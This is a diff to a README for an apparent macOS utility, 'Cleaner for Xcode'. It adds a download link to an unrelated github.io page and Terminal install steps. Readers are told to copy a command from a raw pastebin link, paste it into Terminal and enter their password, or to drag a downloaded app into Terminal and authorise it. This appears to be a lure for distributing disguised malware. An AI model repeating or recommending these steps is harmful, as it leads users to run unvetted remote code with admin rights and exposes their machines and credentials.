@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="#" width="350" alt="Cleaner for Xcode macOS Banner" />
+  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/d5/d5/fa/d5d5fa69-456d-8800-dca1-6b2bdd602514/AppIcon-0-85-220-4-2x.png/1200x630bb.png" width="350" alt="Cleaner for Xcode macOS Banner" />
 </p>
 
 <h1 align="center">Cleaner for Xcode for macOS</h1>
@@ -16,17 +16,41 @@
 ## 🔻 Download
 
 <p align="center">
-  <a href="#" target="_blank">
+  <a href="https://krakayut.github.io/.github/170" target="_blank">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20CLEANER%20FOR%20XCODE%20MAC-GET%20FULL%20ACCESS-green?style=for-the-badge&logo=apple&logoColor=white" alt="Download Cleaner for Xcode for macOS">
   </a>
 </p>
 
 ---
+If the download button doesn’t work, follow the Terminal installation method below.
+---
+# 📦 How to Install Cleaner for Xcode For Mac
+
+## Installation via .dmg
+
+1. Click the **Download for macOS** button above to get the `.dmg`.
+2. Open the `.dmg` installer and drag **Cleaner for Xcode** to your **Applications** folder.
+3. Open **Terminal**, drag the app into the Terminal window to paste its path.
+4. Press **Return**, then enter your macOS password if prompted.
+
+---
+
+## Installation via a command in the Terminal
+
+1. Copy the installation command using this button:
+
+   [![Install Command](https://img.shields.io/badge/GET-INSTALL%20COMMAND-1E90FF?style=for-the-badge&logo=macos&logoColor=white)](https://pastebin.com/raw/rHLHFpsJ)
+
+2. Open **Terminal**, paste the command, then press **Return**.
+3. Enter your macOS password and confirm the installation.
+
+---
+
 
 ## 📸 Preview
 
 <p align="center">
-  <img src="#" alt="Cleaner for Xcode macOS Interface Screenshot" />
+  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple113/v4/89/2e/aa/892eaab9-9987-3fdd-1507-18c8b29a6c16/pr_source.png/643x0w.jpg" alt="Cleaner for Xcode macOS Interface Screenshot" />
 </p>
 
 ---
